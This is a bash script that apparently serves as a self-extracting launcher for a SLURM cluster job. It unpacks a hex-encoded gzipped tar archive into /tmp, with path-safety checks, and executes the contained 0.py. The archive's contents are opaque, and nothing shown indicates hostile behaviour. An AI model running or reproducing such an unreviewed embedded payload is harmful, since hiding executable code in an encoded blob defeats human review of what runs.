#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95cf6fdb2014c77bf65f8172c1962202feed5439eebec3b6cb545504e39834c11690b5d9b4ff7d604755a64abbb5ddb4f7391863f3be0fdee301257b3be89b57857a4a4aa796be6c6996e5cfeff3f7b22aab1b445f775a3327ebb8f12edfc2d75fc88f851b1ea45eacd1826f294bb3bc28abba592cd162e4e7c3c0db7bdbf3b428c388924a99d615e555cd684765c7c49671d1a6ac28ca56d2ba15659dd6695672c132ca9a90f83ccdf3a6c94456f16bd5edd949eb458b3c4dcb340b7f0e5c5f396b58c932d974c2eb77a9ccbab4ae4523286765d550b62d445bd2ba6a699a55192df282a7f9b6eada9a89521675b1f8f9deb1fd17a0643cbfba8f3fd73f63ec45fde77906f5ff16a8e3381887ecd92ec345b0ecb9ed0f6abbf441e9d441469d198e68e42e7c4497c11f7d37329bd0c4de9070b3fbf695dd25b762133448a86f1bc76685e974bbe08418e94bdec927172749c46753bc1acdb097c2adc4703c9eb472e7d57e7f9627bdc3c94a7cc5d3c984ef828cdb7dc711b7567af7972992f9a888f92c3e9d275e9df4f2a9553b69bdabcdc6abfc7e8ce1bbe851b91e5dd6478651ea9827885be4d611ea068324527aea20d5213d382489e64749c246713658c77830a2e7a6bdef195de1642d06ed943ec96b1b65838338415e12138283eab4ee592e2163905b1baeac445ff8e1243f183398187fd696776112e3c9e1c44b8e1b1fca11af66c3db31584aedc8f1a155269e3b76f3c99ce4523e29ebee8787a997f8a18f463979098e233e01860b374d4cce59090909490c39264a8708c774699d8927a7feefb405ae164cf6c3f3563872a5a3f0884d12bdf75e0600000000000000000000000000000000000000000080ff955fa05bf71e00280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
